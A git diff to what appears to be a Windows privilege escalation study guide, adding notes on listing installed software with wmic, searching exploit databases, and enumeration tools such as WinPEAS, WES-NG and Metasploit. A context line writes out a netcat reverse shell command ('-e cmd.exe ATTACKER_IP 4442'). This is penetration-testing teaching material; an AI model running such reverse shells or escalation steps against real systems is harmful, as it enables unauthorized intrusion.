@@ -302,3 +302,37 @@ The exploit may take up to 2 minutes to work so the browser may seem unresponsiv
 
 * The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case.
 * `-a` parameter is used to pass arguments to the executable. To establish a reverse shell, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442` &#x20;
+
+## Abusing Vulnerable Software
+
+Software installed on the target system can present various privilege escalation opportunities. Use the `wmic` tool to list software installed on the target system and its versions.
+
+```shell-session
+wmic product get name,version,vendor
+```
+
+The command may not return all installed programs. Depending on how some programs were installed, they may not be listed and always worth to check desktop shortcuts, available services or any trace that indicates existence of additional software to be vulnerable.
+
+* Gather product version information to search for existing exploits installed on the software on sites like  [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) or [Google](https://www.google.com/).
+
+## Automated Tools
+
+Below are automated tools to enumerate over potential privilege escalation vectors. However, automated tools can sometimes miss privilege escalation.
+
+### WinPEAS
+
+WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).
+
+### PrivescCheck
+
+A PowerShell script alternative to WinPEAS without requiring the execution of a binary file to search common privilege escalation on the target system. PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).
+
+### WES-NG: Windows Exploit Suggester - Next Generation
+
+WES-NG is a Python script that can be downloaded [here](https://github.com/bitsadmin/wesng).
+
+* Avoids making unnecessary noise that can attract attention to antivirus software and runs on the attacking machine.
+
+### Metasploit
+
+If already have a Meterpreter shell on the target system, use `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system.
